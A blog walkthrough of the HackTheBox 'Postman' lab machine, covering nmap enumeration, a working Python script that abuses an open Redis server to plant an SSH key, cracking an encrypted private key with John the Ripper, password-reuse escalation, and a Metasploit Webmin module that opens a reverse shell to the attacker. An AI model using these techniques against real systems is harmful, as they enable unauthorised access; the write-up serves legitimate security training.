---
Title: HackTheBox Postman
Date: 2020-03-21
Category: Challenges
Status: published
---

Postman was an easy-going box. It required careful enumeration and beyond that did not have too much resistance in privilege escalation. This makes it a prime example for real-world M&M security where the initial foothold is hard, but there is few resistance on the inside. Let's start out by scanning the machine:

```sh
# nmap -sS -sC -oN postman.nmap -v 10.10.10.160
# Nmap 7.80 scan initiated Sun Dec  8 11:27:40 2019 as: nmap -sS -sC -oN postman.nmap -v -p1-10000 10.10.10.160
Increasing send delay for 10.10.10.160 from 0 to 5 due to 674 out of 2245 dropped probes since last increase.
Nmap scan report for 10.10.10.160
Host is up (0.11s latency).
Not shown: 9996 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
| ssh-hostkey:
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http
|_http-favicon: Unknown favicon MD5: E234E3E8040EFB1ACD7028330A956EBF
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis
10000/tcp open  snet-sensor-mgmt
| ssl-cert: Subject: commonName=*/organizationName=Webmin Webserver on Postman
| Issuer: commonName=*/organizationName=Webmin Webserver on Postman
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-08-25T16:26:22
| Not valid after:  2024-08-23T16:26:22
| MD5:   96f4 064c e63e 1277 4954 a4d9 a099 56ac
|_SHA-1: 4322 6ff3 ab7a 6ade 2887 9b89 6657 401c 3afd 5217
|_ssl-date: TLS randomness does not represent time

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sun Dec  8 11:29:31 2019 -- 1 IP address (1 host up)
```

There are a few interesting things here already. We have a webserver running on port 80, an unprotected Redis database server on the default port 6379, and a custom application on port 10000. The latter one apparently is using an SSL certificate where the `organizationName` already tells us that we are dealing with a Webmin admin panel here. That is already decent information to start out with! Looking at the website on port 80, there is no real attack surface present. It's just static content.

![Image]({static}/images/screenshot-from-2019-12-01-13-59-10.png){: .image-process-article-image}

Moving on to port 10000, we are presented with a redirect to an SSL site.

![Image]({static}/images/screenshot-from-2019-12-01-13-59-58.png){: .image-process-article-image}

To make this work, we tweak our `/etc/hosts` file a bit and move to the site mentioned above. There we are presented with a Webmin login panel.

![Image]({static}/images/screenshot-from-2019-12-01-14-00-26.png){: .image-process-article-image}

A few tries with default username/password combinations did not yield any success, so let's move on. We don't want to bruteforce the credentials here out of politeness to the other people hacking on it. :) About Redis and port 6379, there is a general rule of thumb for production usage: **NEVER PUT THIS THING ON THE OPEN INTERNET.** If you don't believe me, read the same thing in the [Redis docs](https://redis.io/topics/security) - worded a bit more elegantly:

> Redis is designed to be accessed by trusted clients inside trusted environments. This means that usually it is not a good idea to expose the Redis instance directly to the internet or, in general, to an environment where untrusted clients can directly access the Redis TCP port or UNIX socket.

In my attack I made some assumptions, such as that the user the DB is running under is called `redis`, that its home directory is `/var/lib/redis/` and that the config options used in the attack are available. All of these should be true by default. So I generated a new SSH keypair and hacked up a little Python script:

```python
import redis


print("[+] Reading key")
with open("attacker.key", "r") as keyfile:
    key = "\n\n" + keyfile.read().strip() + "\n\n"

print("[+] Connecting to Redis")
r = redis.StrictRedis(
    host='10.10.10.160',
    port=6379,
)

print("[+] Flushing DB")
r.flushdb()

print("[+] Setting attacker SSH key")
r.set("itdonottouch", key)

print("[+] Setting configuration keys")
r.config_set("dir", "/var/lib/redis/.ssh/")
r.config_set("dbfilename", "authorized_keys")

print("[+] Saving changes to Redis disk")
r.save()

print("[+] Exploit finished - try ssh with redis@10.10.10.160")
```

Pulling this attack off requires basic knowledge of the Python `redis` [package](https://pypi.org/project/redis/), DB flushing, and an understanding of the two config keys I have used. The key names and their effect can be understood by checking out the relevant section in the Redis default config file:

```
# The filename where to dump the DB
dbfilename dump.rdb

# The working directory.
#
# The DB will be written inside this directory, with the filename specified
# above using the 'dbfilename' configuration directive.
#
# The Append Only File will also be created inside this directory.
#
# Note that you must specify a directory here, not a file name.
dir ./
```

After executing the exploit, we simply need to SSH into the box as `redis` user:

```sh
# ssh -i ~/.ssh/id_rsa redis@10.10.10.160
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
redis@Postman:~$ id
uid=107(redis) gid=114(redis) groups=114(redis)
```

Looking around a bit, we find an interesting backup file:

```sh
redis@Postman:~$ ls
/opt/ id_rsa.bak

```

It's an encrypted SSH key, so we `base64` it, copy it over, and decode it.

```sh
redis@Postman:~$ cat /opt/id_rsa.bak | base64
LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRFSy1JbmZvOiBERVMtRURFMy1DQkMsNzNFOUNFRkJDQ0Y1Mjg3QwoKSmVoQTUxSTE3cnNDT09WcXlXeCtDODM2M0lPQllYUTExRGR3L3ByM0wyQTJORHRCN3R2c1hOeXFLRGdoZlFuWApjd0dKSlVEOWtL...
```

```sh
# (cat user.key.bak | base64 -d) > user.key

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----
```

Now to prepare the file for John the Ripper and cracking it:

```
# /usr/share/john/ssh2john.py user.key > user.key.john
# john --wordlist=/usr/share/wordlists/rockyou.txt --fork=4 user.key.john

Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Node numbers 1-4 of 4 (fork)
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (user.key)
4 0g 0:00:00:09 DONE (2019-12-08 12:21) 0g/s 361800p/s 361800c/s 361800C/s *7¡Vamos!
3 0g 0:00:00:10 DONE (2019-12-08 12:21) 0g/s 357468p/s 357468c/s 357468C/sa6_123
1 0g 0:00:00:10 DONE (2019-12-08 12:21) 0g/s 356404p/s 356404c/s 356404C/sie168
Waiting for 3 children to terminate
2 1g 0:00:00:10 DONE (2019-12-08 12:21) 0.09813g/s 351856p/s 351856c/s 351856C/sabygurl69
Session completed
```

Got it. The only thing left to know now is a username. A quick look at `/etc/passwd` helps us here:

```
root:x:0:0:root:/root:/bin/bash
...
Matt:x:1000:1000:,,,:/home/Matt:/bin/bash
redis:x:107:114::/var/lib/redis:/bin/bash
```

However, when we try to SSH into the box as Matt from our remote machine, or the box' `localhost`, we get a permission error. Password authentication in SSH is enabled, however. So a good guess would be that Matt was a lazy user and reused his password that he previously encrypted his SSH key with.

```sh
redis@Postman:~$ su Matt
Password:
Matt@Postman:/var/lib/redis$
```

Damnit, Matt. We talked about this password rotation policy things in so many meetings before! In his home directory we can find the user flag. Now on to root. Poking around the machine with Matt's access rights, we don't find much. It's a good time to think back: We found a Webmin panel and Matt is already guilty once of password reuse. Let's give it another shot.

![Image]({static}/images/screenshot-from-2019-12-08-13-42-37.png){: .image-process-article-image}

Matt, come on! And on top of that, someone didn't install their security updates:

![Image]({static}/images/screenshot-from-2019-12-08-13-44-55.png){: .image-process-article-image}

Webmin itself has a set of very interesting functionalities to manage systems. So it doesn't come as a surprise if it's running under elevated privileges. Scouring the web for some interesting exploits, we find this [Webmin security bulletin](http://www.webmin.com/exploit.html) - and our current version seems to be 1.910. Normally I like to script my exploits in Python to get a deeper understanding of what they do, but this time I was inspired by Matt's laziness and decided to take the easy way in with Metasploit:

```
msf5 exploit(linux/http/webmin_packageup_rce) > options

Module options (exploit/linux/http/webmin_packageup_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   computer2008     yes       Webmin Password
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.10.160     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      10000            yes       The target port (TCP)
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path for Webmin application
   USERNAME   Matt             yes       Webmin Username
   VHOST                       no        HTTP server virtual hostPayload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.13      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen portExploit target:

   Id  Name
   --  ----
   0   Webmin <= 1.910
```

Firing this we end up with a root shell:

```
msf5 exploit(linux/http/webmin_packageup_rce) > exploit

[*] Started reverse TCP handler on 10.10.14.13:4444
[+] Session cookie: 93a0b7c6234b1354928550dc12865af2
[*] Attempting to execute the payload...
[*] Command shell session 2 opened (10.10.14.13:4444 -> 10.10.10.160:43526) at 2019-12-08 12:58:17 +0000
id
uid=0(root) gid=0(root) groups=0(root)
```

... and the root flag is secured.

If there is anything to be learnt here, it is to never use Redis as an open service to the internet, and to always make sure your users do not reuse their passwords. Especially not if they're as crappy as `computer2008`. Often times users are not doing this because they're stupid, but rather because they lack vital security education. So let's not rant too much about Matt and hope his employer is going to send him to some nice workshops to get him up to speed. :)
